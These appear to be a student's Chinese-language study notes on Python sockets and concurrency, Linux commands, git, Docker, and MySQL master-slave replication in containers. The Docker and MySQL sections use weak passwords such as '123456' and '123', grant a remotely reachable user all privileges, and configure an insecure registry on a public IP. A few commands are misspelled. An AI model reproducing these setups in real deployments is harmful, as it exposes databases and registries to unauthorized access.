#插电话卡:绑定ip地址  传元组:(ip,端口号)
soc.bind(('192.168.11.146',8080))  #如果写本机ip，局域网外部可以访问
# soc.bind(('127.0.0.1',8080))    #如果写127.0.0.1，只能自己访问

#开机，监听,这个5 是半连接池的大小
soc.listen(5)
#等待别人给我打电话
print('xxxx')
conn,addr=soc.accept()
print('yyyy')
print(addr)
# conn 就是通路
#接收1024个字节
data=conn.recv(1024)
print('我收到客户端发的',data)
#conn.send  发送数据，数据必须是bytes格式
conn.send(b'xxxxx')

#挂断电话
conn.close()
#销毁手机
soc.close()
```

```python
#客户端
import socket
#创建一个socket对象
soc=socket.socket()
#连接服务端
soc.connect(('192.168.11.146',8080))
#发送消息
soc.send(b'xxx')

data=soc.recv(1024)
print('我收到服务端回的',data)
#关闭连接
soc.close()
```



# 进程/线程

## 进程

### 二、什么是进程

**==进程就是资源的集合，程序执行的过程。==**

### 三、进程的概念

1. 进程是一个实体。每一个进程都有它自己的地址空间，一般情况下，包括文本区域（text region）、数据区域（data region）和堆栈（stack region）。文本区域存储处理器执行的代码；数据区域存储变量和进程执行期间使用的动态分配的内存；堆栈区域存储着活动过程调用的指令和本地变量。
### 五、进程的特征

   ==**进程之间具有隔离性，进程必须等待子进程执行完毕**==

   * 动态性：进程的实质是程序在多道程序系统中的一次执行过程，进程是动态产生，动态消亡的。
   * 并发性：任何进程都可以同其他进程一起并发执行
   * 独立性：进程是一个能独立运行的基本单位，同时也是系统分配资源和调度的独立单位；
   * 异步性：由于进程间的相互制约，使进程具有执行的间断性，即进程按各自独立的、不可预知的速度向前推进
   * 结构特征：进程由程序、数据和进程控制块三部分组成。

   多个不同的进程可以包含相同的程序：一个程序在不同的数据集里就构成不同的进程，能得到不同的结果；但是执行过程中，程序不能发生改变。

### 六、进程与程序中的区别

   程序是指令和数据的有序集合，其本身没有任何运行的含义，是一个静态的概念。而进程是程序在处理机上的一次执行过程，它是一个动态的概念。

   程序可以作为一种软件资料长期存在，而进程是有一定生命期的。

   程序是永久的，进程是暂时的。

   注意：**同一个程序执行两次，就会在操作系统中出现两个进程，所以我们可以同时运行一个软件，分别做不同的事情也不会混乱。**

### 开启子进程的方式1

```python
from multiprocessing import Process
import time
def task():
    print('进程 start')
    time.sleep(2)
    print('进程 end')
if __name__ == '__main__':#当开启子进程的时候，执行main内的代码
    # 不会出现像递归一样的方式，一直创建子进程，在main内只会创建一个子进程
    p = Process(target=task)#开子进程  申请新的内存空间 把父进程的所有代码完整拷贝一份过去
    p.start()#告诉操作系统要开启子进程
    time.sleep(3)
    print('主进程')
###############
进程 start
进程 end
主进程

```

### 方式1开启多个子进程

```python
from multiprocessing import Process
import time
def task(x):
    print(f'子进程{x}-————>start')
    time.sleep(2)
    print(f'进程{x}-————>end')
if __name__ == '__main__':#当开启子进程的时候，执行main内的代码
    # 不会出现像递归一样的方式，一直创建子进程，在main内只会创建一个子进程
    p1 = Process(target=task,args=('ocean',))#开子进程  申请新的内存空间 把父进程的所有代码完整拷贝一份过去
    p2 = Process(target=task,args=('sky',))
    p1.start()
    p2.start()
    time.sleep(2)
    print('主进程')
#################
子进程ocean-————>start
子进程sky-————>start
主进程
进程ocean-————>end
进程sky-————>end
```



### 开启子进程的方式2

```python
from multiprocessing import Process
import time
class Test(Process):
    def __init__(self,sex):
        super().__init__()
        self.sex = sex
    def run(self):
        print(f'子进程的性别是{self.sex}------>start')
        time.sleep(1)
        print(f'子进程end')
if __name__ == '__main__':#当开启子进程的时候，执行main内的代码
    # 不会出现像递归一样的方式，一直创建子进程，在main内只会创建一个子进程
    p = Test('女')#开子进程  申请新的内存空间 把父进程的所有代码完整拷贝一份过去
    p.start()
    print('主进程')
##############################
主进程
子进程的性别是女------>start
子进程end

```

### 验证隔离性（内存空间隔离）

```python
from multiprocessing import Process
import time
x = 0
def task():
    global x
    x = 100
    print('子进程的x修改为{}'.format(x))
if __name__ == '__main__':
    p = Process(target=task)
    p.start()
    time.sleep(3)
    print(x)
#################
子进程的x修改为100
0
```





## 僵尸进程和孤儿进程

1. 僵尸进程：父进程的子进程结束的时候父进程没有wait（）情况下子进程会变成僵尸进程。父进程等着所有的子进程结束才会结束。
2. 孤儿进程（无害）一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。
3. 有害的情况
   1. 情况1  无害父进等着子进程都死，回收僵尸进程。
      2. 情况2  无害父进程死了，子进程活着，都要被init进程接管并且回收。
      3. 情况3父进程一直不死，造成了大量僵尸进程。占用了大量的pid号pid号是有限的。
      4. 解决方案：最直接的办法就是杀死父进程 。

## 守护进程

会随着主进程的结束而结束。

主进程创建守护进程

　　其一：守护进程会在主进程代码执行结束后就终止

　　其二：守护进程内无法再开启子进程,否则抛出异常：

## 线程

### 一、线程

1. 初识线程
   在传统操作系统种，每个进程有一个地址空间，而且默认就有一个控制线程，cpu真正的执行单位是线程。
   在工厂中，每一个车间都有房子，而且每个车间默认就有一个流水线。

2. 做一个比较

   ​			相当于
   操作系统------->工厂
   进程------->车间
   线程------->流水线
   cpu------->电源

3. 线程：cpu最小的执行单位
   进程：资源集合/资源单位
   线程运行 ------->代码运行
   进程运行------->各种资源 + 线程

4. 右键运行会发生的事情：申请内存空间，先将解释器代码丢进去并且把python代码丢进去（进程做的）（内存运行的时候不识别python文件代码，只有解释器才能识别python文件代码，所有先把解释器放入内存），运行代码（线程）

5. 进程和线程的区别：
   过程描述的区别
   线程------->单指代码的执行过程
   进程------->资源的申请与销毁的过程

6. 进程内存空间彼此隔离（**内存共享or隔离**）

   多个进程内存空间彼此隔离。

   同一进程下的多个线程共享该进程内的数据。同一个进程下的线程共享资源

7. 进程和线程的创造速度
   进程需要申请资源开辟空间------->慢
   只是告诉操作系统一个执行方案------->快

8. **1 进程的启动和销毁（空间开始和释放）**

   只要一说一个进程启动了，那你知道了一个事情，是关于这个程序的一块空间造好了。

   只要一说进程销毁了，那你也知道了一个事情，是关于这个程序的空间释放了。

   **2 线程的启动和销毁（进程里的一段代码运行起来了，进程里的一段代码运行结束）**

9. **进程之间是竞争关系，线程之间是协作关系？（了解）**

   车间直接是竞争/抢电源的关系，竞争（不同的进程直接是竞争关系，是不同的程序员写的程序运行的，迅雷抢占其他进程的网速，360把其他进程当做病毒干死）
   一个车间的不同流水线式协同工作的关系（同一个进程的线程之间是合作关系，是同一个程序写的程序内开启动，迅雷内的线程是合作关系，不会自己干自己）



## 多线程

### 1.3解决死锁方法（递归锁）

解决方法，递归锁，在Python中为了支持在同一线程中多次请求同一资源，python提供了可重入锁RLock。

### 二、信号量Semaphore

同进程的一样

**实现：定制了锁的个数，也就意味着最多有几个线程可以抢到锁头**



Semaphore管理一个内置的计数器，
每当调用acquire()时内置计数器+1；
调用release() 时内置计数器-1；
计数器不能小于0；当计数器为0时，acquire()将阻塞线程直到其他线程调用release()。

实例：(同时只有5个线程可以获得semaphore,即可以限制最大连接数为5)：



## 多进程

### 七、进程池和线程池

### 7.1进程池和线程池的意义

1. 进程池和线程池

   1. 进程池和线程池的功能是限制进程数或者线程数。

2. 什么时候限制？

   当并发的任务数量远远大于计算机所能承受的范围的时候，即无法一次性开启过多的任务数量，就应该考虑去限制进程数或者线程数，从而保证服务器不会崩溃。（荡机）

## 协程

1. python的线程用的是操作系统原生的线程

### 8.1什么是协程

1. 协程：单线程下实现并发
2. 并发：切换+保存状态
3. 多线程：操作系统帮助实现，如果遇到io切换，执行时间过程也会切换，实现一个雨露均沾的效果

* 什么样的协程是有有意义的？

  1. 遇到io切换的时候是有意义的
  2. 具体：协程的概念本质是程序猿抽象出来的，操作系统根本不知道协程的存在，也就是说来了一个线程我自己遇到io，我自己线程内部直接切到自己的另一个线程任务上，操作系统根本不知道这个过程。

* 优点：

  1. 自己控制切换要比操作系统控制切换的快的多

* 缺点：

  1. 对比多线程

     自己要检测所有的io,只要有一个阻塞整体都会跟着阻塞

  2. 对比多进程

     无法利用多核优势

* 为什么要有协程？

  自己控制切换的速度比操作系统控制切换的快，降低了单个线程的io时间。

# Linx

/bin    /home  /dev   /proc  /mnt   /usr  /etc /lib

/bin:存储系统所使用命令的可执行文件

/home：普通用户的家目录         (cd home)

/dev:外部设备（存的是设备的接口   通过接口能访问设备）

/proc：虚拟目录    以进程为单位存储内存的映射--------一些统计信息

/mnt：临时挂载点（将接口挂载到临时挂载点进行操作）

/usr：第三方软件的一些文档

/etc：系统配置目录

/lib：库文件（静态库          共享库（动态库））

冯*诺依曼     五大部件

（计算器  控制器）cpu       (存储器)内存 主存------缓存数据（为了使cpu效率提高）（输入设备  输出设备）I/O 硬盘 显示器 键盘

数据从硬盘读到内存 再读到cpu去执行

Linux上一切皆文件：不以文件扩展名区分文件类型（将文件分为五大类）

               普通文件：-（.c      .h      .cpp    .java       .class       .txt     .pdf都属于普通文件）
    
              目录文件：d    文件夹
    
              链接文件:l(L)
    
              管道文件:p （进程间通讯的专用文件）
    
             设备文件 ：字符设备(c)           块设备(b)            套接字(s)

ls  -l






文件提供给不同用户不同的权限（属主（创建者）    属组（组用户的名称）    其他用户

三种用户 ：三组权限



                u             g         o

r： 读权限

w：写权限

x：执行权限    普通文件（前提是他是可执行文件）

      是否可进入   目录文件          针对文件不同，x的含义不同

文件操作命令：

文件创建：普通文件 （touch）         目录文件----文件夹（mkdir）

文件删除：普通文件（rm）               目录文件(rmdir-----删除空目录             rm -r 删除非空目录)

文件拷贝：普通文件（cp原文件路径+文件名       拷贝的目的地）                目录文件(cp   -r     原文件路径+文件名    拷贝目的地的路径)把目录里面的文件都拷贝过去

文件剪切/重命名：普通文件（mv）              目录文件（mv）

边移动边重命名：如下图    stu3目录下本来就有一个project1所以剪切过来要重命名。这里的project1和project2是相同的文件



mv   /home/stu1/project1    (这里中间要用空格隔开)/home/stu1/project2  单纯的重命名

修改属性：（文件类型一旦创建就不能修改，权限可以修改，链接数不能改，是随着操作变化的；属主可以改；属组可以修改；文件大小不能改，是你往里面加了东西才修改）

修改属主：只能root用户修改，chown newuser（改成谁） filename（所改的文件）

修改属组：只能root用户修改，chgrp  newgroup（新的组，原来在那个组不用关心）  filename

修改权限：chomd  

1、用字符方式修改   chmod  a（all所有的）/u/g/o   +/-/=(赋值)   r/w/x/rw/rx/wx/rwx

2、用数字方式修改：



每个n代表一个用户的权限，一共有3个n,每个n都是0-7的数字

chmod   nnn filename

   linux基本命令

cd   跟路径  ：切换目录

ls -l   ：显示文件详细信息

ls -a  ： 显示所有文件 （包含隐藏文件文件名以“.”开头的都是隐藏文件）

cd ..  ：可以退回上级目录

cd -  ：两个目录之间来回切换

cd ~ ：直接返回家目录

pwd：查看当前目录的绝对路径/查看当前位置   
# Git

```
1）git clone:克隆指定仓库
2）git status：查看当前仓库状态
3）git diff：比较版本的区别
4）git log：查看日志
5）git reset：回溯历史版本
6）git add：将文件添加到暂存区
7）git commit：将文件提交到服务器
8）git checkout：切换到指定分支
9）git rm：删除指定文件
.gitignore文件的作用：
# 此为注释 – 将被 Git 忽略
*.a       # 忽略所有 .a 结尾的文件
!lib.a    # 但 lib.a 除外
/TODO     # 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODO
build/    # 忽略 build/ 目录下的所有文件
doc/*.txt # 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt
```



![](https://img2018.cnblogs.com/blog/1739658/201911/1739658-20191129164831642-40357993.png)



![](https://img2018.cnblogs.com/blog/1739658/201911/1739658-20191129164835788-1425301669.jpg)







# 常见的Content-Type类型

MediaType,即是Internet Media Type,互联网媒体类型；也叫做MIME类型， 在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。

常见的媒体格式类型如下

* text/html:HTML格式
* text/plain:纯文本格式
* text/xml:XML格式
* image/gif:gif图片格式
* image/jpeg:jpg图片格式
* image/png:png图片格式

以application开头的媒体格式类型：

* application/xhtml+xml:XHTML格式
* application/xml:XML数据格式
* application/atom+xml:Atom XML聚合格式
* application/json:JSON数据格式
* application/pdf:pdf格式
* application/msword:Word文档格式
* application/octet-stream:二进制流数据（常见的文件下载)
* application/x-www-form-urlencoded:表单中默认的encType,表单数据被编码为key/value格式发送到服务器

另外一种常见的媒体格式是上传文件时使用：

* multipart/form-data:需要在表单中进行文件上传时，就需要使用该格式

C#中的HttpClient如何设置这些Content-Type，可看下这篇:

[HttpClient的Content-Type设置](https://www.cnblogs.com/zzr-stdio/p/10165539.html)





# 轮询/长轮询/websocket

## 轮询(效率低，基本不用)

```python
"""
原理
	让浏览器每隔几秒钟通过ajax朝服务端发送请求来获取数据
	eg:每隔5s中朝服务端发送一次请求

不足之处:
	消息延迟很高
	消耗资源较多
	请求次数太高
"""
```

## 长轮询(兼容性好)

```python
"""
原理
	服务端给每个客户端建立队列，让浏览器通过ajax向后端偷偷的发送请求，去各自对应的队列中获取数据，如果没有数据回阻塞，但是不会一直阻塞，会通过timeout参数及一场处理的方式限制阻塞事件，比如30s后返回客户端触发回调函数让浏览器再次发送请求

相对于轮询
	消息基本没有延迟
	请求次数降低了
	资源消耗减少
"""

# 现在web版本的qq和微信还是基于长轮询实现的(大公司web项目可能都会使用)
```

#### 基于ajax及队列自己实现简易版本的长轮询群聊功能

大公司一般情况下都会使用上面长轮询的方式，因为兼容性好

## websocket(主流浏览器和框架都支持)

```python
"""
http  网络协议  不加密传输
https  网络协议  加密传输
	上面这两个协议都是短链接
websocket  网络协议 加密传输	
	websocket的诞生 真正意义上实现了服务端给客户端主动推送消息
"""
```

#### 内部原理

```python
"""
内部原理
	1.握手环节(handshake)
		目的:验证服务端是否支持websocket协议
		客户端浏览器第一次访问服务端的时候
		浏览器内部会自动生成一个随机字符串，将该随机字符串发送给服务端(基于http协议)，自己也保留一份(请求头里面)
		
		服务端接受到随机字符串之后，会让它跟magic string(全球统一)做字符串的拼接
		然后利用加密算法对拼接好的字符串做加密处理(sha1/base64)
		客户端也在对产生的随机字符串做上述的拼接和加密操作
		
		服务单将产生好的随机字符串发送给客户端浏览器(响应头里面)
		客户端浏览器会比对服务单发送的随机字符串很我浏览器本地操作完的随机字符串是否一致，如果一致说明该服务端支持websocket，如果不一致则不支持
	
	2.收发数据(send/onmessage)
		验证成功之后就可以数据交互了 但是交互的数据是加密的 需要解密处理
		前提:
			1.数据基于网络传输都是二进制格式
			2.单位换算 8bit = 1bytes
		
		读取第二个字节的后七位称之为payload
		1.根据payload大小决定不同的处理方式
		=127  再读取8个字节 作为数据报
		=126  再读取2个字节 作为数据报
		<=125 不再往后读了
		
		
		2.步骤1之后 会对剩下的数据再读取4个字节(masking-key)
		之后依据masking-key算出真实数据
		var DECODED = "";
			for (var i = 0; i < ENCODED.length; i++) {
    			DECODED[i] = ENCODED[i] ^ MASK[i % 4];
				}
"""
# 课下自己整理 说出重点即可   payload   masking-key
```

# Docker



课件地址：https://www.cnblogs.com/xiaoyuanqujing/articles/11774978.html

## Docker

基于go语言实现的

二次开发：在原有的系统上进行开发，原有系统源码拿不到





docker 实现轻量级的操作系统虚拟化，基于linux操作系统上的lxc实现的

没有docker之前，项目上线

开发完成--代码由运维人员从git上来下来---在服务器上装环境（python，mysql，reidis，环境版本问题）---运行项目

如果有了docker

开发完成--代码由运维人员从git上来下来---docker镜像（不再需要重复的安装软件，解决的就是软件版本不一致的问题）---运行

docker 更轻量级

启动速度快，占用体积小，一个centos7的系统，只需要几十个m（没有操作系统）

在操作系统之上通过lxc技术，实现虚拟化出操作系统

docker 是一个软件，通过这个软件虚拟化出操作系统





django、flask 同步框架

tornado，sanic异步框架:一旦异步，以后全都得用异步

asyncio 提前看一下，有兴趣的同学，学习一下

## 二 docker架构和使用

docker 是一个软件，c/s架构的软件（mysql，redis）

docker 客户端跟服务端通信，是通过http协议，resful规范（新的软件，基本上都是走http协议，resful规范），es

### 重点 ：镜像和容器

基于镜像来运行容器：镜像是面向对象中的类，容器是面向对象中的对象

注册中心：docker 是一个软件，需要虚拟化出操作系统，操作系统从哪来？从注册中心拉下来的，从注册中心来下来的东西，叫镜像（比如要拉一个centos7的镜像），镜像运行起来，叫容器（才是真正的跑起来的操作系统）

一个centos7镜像，跑起来两个容器，在一个容器上装了mysql，在另一个上装了python3.6

### 2.1docker 安装

windows（win10及以上，下一个docker软件，下一步安装就可以了）/linux(乌班图，centos)/Mac

乌班图上很简单，因为docker就是在乌班图上开发的

在centos上安装，要在7.x以上，在上面装docker

mac本质就是unix操作系统，在终端连接

ssh root@101.133.225.166

### 2.2 docker 安装

```python
sudo yum update
sudo yum install -y yum-utils device-mapper-persistent-data lvm2
sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
  
sudo yum install docker-ce
#docker软件安装完成，服务端和客户端都安装完成，
docker -v #查看客户端版本 
```

### 2.3 启动docker

docker 安装完，服务端没有启动，需要启动

```python
systemctl start docker # 7.x用这个命令启动
systemctl stop docker #停止docker服务端
  
  
# 了解
启动docker：

systemctl start docker
停止docker：

systemctl stop docker
重启docker：

systemctl restart docker
查看docker状态：

systemctl status docker
开机启动：

systemctl enable docker
查看docker概要信息

docker info
查看docker帮助文档

docker --help
```

### 2.4 镜像操作

查找镜像：docker search centos，会去https://hub.docker.com/查找

直接去该地址查找即可

镜像名称，是否是官方镜像，描述，stars数

拉去centos7的版本镜像

docker pull centos:centos7

docker pull centos:8

docker pull python:3.6   其实下载下什么东西？镜像，其实是一堆文件，

那centos7和python的区别是什么？如果下载python3.6 ：就是一个操作系统上安装了python环境，从官方拉，是乌班图+python

docker pull mysql:5.6    下载了一个镜像，镜像里安装了mysql，就相当于操作系统上安装了mysql

#### 查看服务端所有的镜像

docker images

#### 删除镜像 (容器如果没有删除，镜像删除不了)

docker rmi id号   id号可以缩写

docker rmi 5e3

### 2.5 容器操作

镜像运行，是启动容器，一个个的容器，就是一个个的操作系统

一个centos7的镜像，可以跑起多个容器，每一个容器就是一个操作系统

#### 查看容器

docker ps：查看正在运行的容器

docker ps –a：查看所有容器（包括停止和运行的）

#### 创建启动容器

docker run -it --name=mycentos centos:centos7 /bin/bash

exit  退出容器,容器也就停止了

docker run -di --name=mycentos2 centos:centos7     不进入容器 内部

docker exec -it mycentos2  /bin/bash    进入到容器内容

exit退出，容器不停止



docker stop id号或者名字    容器停止

docker start id号或者名字   启动容器



### 1拷贝文件

1 docker cp 1.txt mycentos2:/home   从宿主机拷贝文件到容器内部

2 docker cp mycentos2:/home/1.txt /home/1.txt  从容器往外拷贝，不需要进入容器内部

### 2 目录挂载

docker run -di -v /home/lqz:/home --name=mycentos3 centos:centos7

### 3查看容器的ip地址

1 查看容器详情：docker inspact 容器名字/id    NetworkSettings下的IPAddress是容器的ip地址

2 查看容器ip    docker inspect --format='{{.NetworkSettings.IPAddress}}' 容器名称（容器ID）

### 4 服务部署

#### 部署mysql

拉取：docker pull mysql:5.6

启动：docker run -di --name=mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:5.6

远程连接宿主机的3306端口，即可连接到容器的mysql服务

#### 部署redis

docker  pull reids     不加tag ，拉最新的版本，也就是lasted版本

docker run -di --name=myredis -p 6379:6379 redis  启动redis

### 5 迁移与备份

#### 将容器保存为镜像

docker commit 容器名字 要打包成的镜像名字

docker commit mycentos2 lqz_centos7

基于打包好的镜像，再跑起容器来，那么容器内部原来装的软件，都会有

docker run -di --name=lqz_centos7_1 lqz_centos7:latest

启动起容器来，软件都会有

#### 镜像备份

docker  save -o lqz_centos7.tar lqz_centos7

#### 镜像恢复

docker load -i lqz_centos7.tar

### 6 私有仓库

1 docker pull registry   拉下一个镜像

2 docker run -di --name=registry -p 5000:5000 registry   启动镜像形成容器

3 打开浏览器 输入地址http://101.133.225.166:5000/v2/_catalog    没有上传镜像，是空的 {"repositories":[]}

#### 配置私有仓库

vi /etc/docker/daemon.json

{"insecure-registries":["101.133.225.166:5000"]} 

重启docker 服务

systemctl restart docker

重启registry的容器

docker restart registry

#### 上传到私有仓库

打标签

docker tag lqz_centos7 101.133.225.166:5000/lqz_centos7

上传标记的镜像

docker push 101.133.225.166:5000/lqz_centos7



本地删除镜像后，可以从私有仓库拉下来

docker pull 101.133.225.166:5000/lqz_centos7

再跑起容器，内部就有aaa  bbb文件夹

docker logs b8bdd9c57f22查看容器启动日志

## dockerfile，部署一个小项目

dockerfile：由一系列命令和参数构成的脚本，通过这个文件构建镜像，dockerfile就是一个文件，占得空间非常小

dockerfile是一个文件+一堆命令

#### 命令

FROM 镜像名字:镜像标签    FROM centos:centos7   指定基于哪个镜像

MAINTAINER 作者           作者是谁   

ENV key value               环境变量

RUN 命令                    要执行的命令

ADD 文件路径            拷贝文件到镜像内（自动解压）

COPY 文件路径       拷贝文件到镜像内（不会自动解压）

WORKDIR 路径        工作目录（工作的目录，一旦启动起容器来，进入，在的路径）

## 1 dockerfile构建镜像

### 1.1 创建Dockerfile，在根路径下一定要有项目untitled3.tar

#### tar -cvf untitled3.tar untitled3

#### untitled3项目内部必须有个uwsgi.ini   最后一句的daemonize去掉

注意：默认linux是解压不了zip格式的，需要安装unzip和zip

现在统一用的tar格式 ，linux就可以解压

```python
FROM python:3.6
MAINTAINER lqz
WORKDIR /home
RUN pip install django==1.11.9
RUN pip install uwsgi
EXPOSE 8081
ADD ./untitled3.tar /home/
CMD ["uwsgi", "--ini", "/home/untitled3/uwsgi.ini"] 
```

### 1.2 构建镜像

docker build -t='mydockerfile_django' .

#### 通过镜像，跑起容器

docker run -id --name=django1.11.9_my django1.11.9:latest

### 1.3 查看镜像

docker images   就可以看到mydockerfile_django镜像

#### 进入到容器内部

docker exec -it django1.11.9_my /bin/bash

### 1.4 通过镜像运行容器(不需要挂载目录，项目已经在镜像内部了)

docker run -di --name=my_dockerfile_django -p 8081:8081 mydockerfile_django:latest

项目就跑起来了

# 数据库主从搭建

### 2.1 主从同步原理

mysql主从配置的流程大体如图：

1）master会将变动记录到二进制日志里面；

2）master有一个I/O线程将二进制日志发送到slave;

3) slave有一个I/O线程把master发送的二进制写入到relay日志里面；

4）slave有一个SQL线程，按照relay日志处理slave的数据；

### 2.2 注意点

1 咱们用docker模拟了两台服务器，服务器的系统，mysql的版本必须一致

### 2.3 具体步骤,启动主库

```python
docker pull mysql:5.7
#在home目录下创建mysql文件夹，下面创建data和conf.d文件夹 
mkdir /home/mysql 
mkdir /home/mysql/conf.d 
mkdir /home/mysql/data/
# 创建my.cnf配置文件
touch /home/mysql/my.cnf
#写入

[mysqld]
user=mysql
character-set-server=utf8
default_authentication_plugin=mysql_native_password
secure_file_priv=/var/lib/mysql
expire_logs_days=7
sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION
max_connections=1000
##主库----start--- 同一局域网内注意要唯一
server-id=100  
## 开启二进制日志功能，可以随便取（关键）
log-bin=mysql-bin
##主库----end--- 
[client]
default-character-set=utf8

[mysql]
default-character-set=utf8


#启动主库容器（挂载外部目录，端口映射成33307，密码设置为123456）
docker run  -di -v /home/mysql/data/:/var/lib/mysql -v /home/mysql/conf.d:/etc/mysql/conf.d -v /home/mysql/my.cnf:/etc/mysql/my.cnf -p 33307:3306 --name mysql-master -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7
```

### 2.4 启动从库

```python
#在home目录下创建mysql2文件夹，下面创建data和conf.d文件夹 
mkdir /home/mysql2
mkdir /home/mysql2/conf.d 
mkdir /home/mysql2/data/
#mkdir /home/mysql2 /home/mysql2/conf.d /home/mysql2/data/
# 创建my.cnf配置文件
touch /home/mysql2/my.cnf

[mysqld]
user=mysql
character-set-server=utf8
default_authentication_plugin=mysql_native_password
secure_file_priv=/var/lib/mysql
datadir=/var/lib/mysql
expire_logs_days=7
sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION
max_connections=1000

server-id=101
log-bin=mysql-slave-bin
relay_log=edu-mysql-relay-bin

[client]
default-character-set=utf8

[mysql]
default-character-set=utf8


docker run  -di -v /home/mysql2/data:/var/lib/mysql -v /home/mysql2/conf.d:/etc/mysql/conf.d -v /home/mysql2/my.cnf:/etc/mysql/my.cnf -p 33306:3306 --name mysql-slave -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7
         

```

### 2.5 远程连接到主库和从库

```python
#主库
mysql -h 101.133.225.166 -P 33307 -u root -p123456
##创建test用户,设置任意ip地址可以访问，密码为123
create user 'test'@'%' identified by '123';
##授权用户，把所有权限授权给test，他就相当于root了
grant all privileges on *.* to 'test'@'%' ;
###刷新权限
flush privileges;
#查看主服务器状态(显示如下图)
show master status; 



#从库
mysql -h 101.133.225.166 -P 33306 -u root -p123456
#配置详解
/*
change master to 
master_host='MySQL主服务器IP地址', 
master_user='之前在MySQL主服务器上面创建的用户名'， 
master_password='之前创建的密码', 
master_log_file='MySQL主服务器状态中的二进制文件名', 
master_log_pos='MySQL主服务器状态中的position值';
*/
#命令如下
change master to master_host='101.133.225.166',master_port=33307,master_user='test',master_password='123',master_log_file='mysql-bin.000003',master_log_pos=0;
#启用从库
start slave;
#查看从库状态（如下图）
show slave status\G;



```

### 2.6 测试

```
#在主库上创建数据库test1
create database test1;
use test1;
#创建表
create table tom (id int not null,name varchar(100)not null ,age tinyint);
#插入数据
insert tom (id,name,age) values(1,'xxx',20),(2,'yyy',7),(3,'zzz',23);
#在从库上查看是否同步成功
#查看数据库
show database;
use test1;
#查看表
show tables;
#查看数据
select * from test1;
```





